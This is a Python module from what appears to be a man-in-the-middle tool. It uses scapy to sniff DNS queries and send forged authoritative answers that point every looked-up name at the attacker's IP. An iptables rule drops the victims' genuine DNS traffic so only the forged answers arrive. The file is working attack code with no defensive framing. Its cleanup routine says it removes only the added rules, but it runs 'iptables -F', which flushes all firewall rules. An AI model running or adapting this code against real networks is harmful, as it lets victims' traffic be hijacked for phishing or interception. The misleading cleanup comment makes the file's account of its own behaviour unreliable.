import os
import sys
import threading
from scapy.all import *
from time import sleep
from subprocess import Popen, PIPE
import colors


class Dns():
    def __init__(self, attacker_ip):
        self.attacker_ip = attacker_ip

    # Checks if is a valid DNS query and sends a spoofed response
    def fake_dns_response(self, pkt):
        if (pkt[IP].src != "127.0.0.1" and pkt[IP].src != self.attacker_ip):
            forged_DNSRR = DNSRR(
                rrname=pkt[DNS].qd.qname, ttl=3600, rdlen=4, rdata=self.attacker_ip)
            forged_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) /\
                UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /\
                DNS(id=pkt[DNS].id, qr=1, aa=1,
                    qd=pkt[DNS].qd, an=forged_DNSRR)
            send(forged_pkt, verbose=0)
            print((colors.BLUE + "\nmitm" + colors.WHITE + ":" + colors.BLUE + "dns" + colors.WHITE + "> " +
                   colors.DEFAULT + "Redirect " + colors.GREEN + "%s" + colors.DEFAULT + " from "
                   + colors.YELLOW + "%s" + colors.DEFAULT + " to " + colors.ORANGE + "%s" + colors.DEFAULT)
                  % (pkt[IP].src, pkt[DNS].qd.qname.decode("utf-8"), self.attacker_ip))

    # Set dns filter and iptables to drop victim requests
    def spoof(self):
        sniff_filter = 'udp dst port 53'
        Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"],
              shell=True, stdout=PIPE)
        while True:
            sniff(prn=self.fake_dns_response, filter=sniff_filter, store=0)

    # Delete appended iptables rules
    def restore_iptables(self):
        Popen(["iptables -F"], shell=True, stdout=PIPE)
